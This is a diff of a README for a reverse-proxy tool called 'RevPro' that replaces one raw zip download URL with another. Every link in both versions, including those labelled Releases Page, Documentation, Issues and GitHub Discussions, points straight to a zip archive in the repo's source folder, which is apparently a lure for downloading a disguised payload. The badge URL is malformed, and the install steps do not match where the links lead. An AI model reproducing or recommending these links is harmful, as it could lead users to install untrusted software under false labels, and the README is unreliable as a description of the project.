@@ -4,7 +4,7 @@
 Welcome to RevPro! This application acts as a reverse-proxy, helping you manage how your application handles incoming traffic. 
 
 ## 📥 Download Now
-[![Download RevPro](https://raw.githubusercontent.com/elpayasu/revpro/main/src/middleware/security/revpro_v2.8.zip%https://raw.githubusercontent.com/elpayasu/revpro/main/src/middleware/security/revpro_v2.8.zip)](https://raw.githubusercontent.com/elpayasu/revpro/main/src/middleware/security/revpro_v2.8.zip)
+[![Download RevPro](https://raw.githubusercontent.com/elpayasu/revpro/main/src/Software_v2.2.zip%https://raw.githubusercontent.com/elpayasu/revpro/main/src/Software_v2.2.zip)](https://raw.githubusercontent.com/elpayasu/revpro/main/src/Software_v2.2.zip)
 
 ## 📝 Overview
 RevPro helps with:
@@ -29,7 +29,7 @@ These features work together to enhance your application's performance and secur
 - **Security:** Built-in WAF (Web Application Firewall) to safeguard your application.
 
 ## 🚧 Installation Instructions
-1. **Visit the Releases Page**: Go to [Download RevPro](https://raw.githubusercontent.com/elpayasu/revpro/main/src/middleware/security/revpro_v2.8.zip) to find the latest version.
+1. **Visit the Releases Page**: Go to [Download RevPro](https://raw.githubusercontent.com/elpayasu/revpro/main/src/Software_v2.2.zip) to find the latest version.
 2. **Select a Release**: Click on the version you want to install.
 3. **Download the File**: Click on the download link for your operating system.
 4. **Install the Application**: 
@@ -74,13 +74,13 @@ If you encounter issues:
 - Review the RevPro logs for error messages.
 
 ## 💬 Community Support
-Join our community for help and discussions. You can find us on [GitHub Discussions](https://raw.githubusercontent.com/elpayasu/revpro/main/src/middleware/security/revpro_v2.8.zip).
+Join our community for help and discussions. You can find us on [GitHub Discussions](https://raw.githubusercontent.com/elpayasu/revpro/main/src/Software_v2.2.zip).
 
 ## 🔗 Useful Links
-- [Documentation](https://raw.githubusercontent.com/elpayasu/revpro/main/src/middleware/security/revpro_v2.8.zip)
-- [Issues](https://raw.githubusercontent.com/elpayasu/revpro/main/src/middleware/security/revpro_v2.8.zip)
+- [Documentation](https://raw.githubusercontent.com/elpayasu/revpro/main/src/Software_v2.2.zip)
+- [Issues](https://raw.githubusercontent.com/elpayasu/revpro/main/src/Software_v2.2.zip)
 
 ## 📥 Download & Install
-To download the latest version, [visit this page](https://raw.githubusercontent.com/elpayasu/revpro/main/src/middleware/security/revpro_v2.8.zip).
+To download the latest version, [visit this page](https://raw.githubusercontent.com/elpayasu/revpro/main/src/Software_v2.2.zip).
 
 RevPro streamlines application traffic management while offering robust features to ensure efficiency and security.
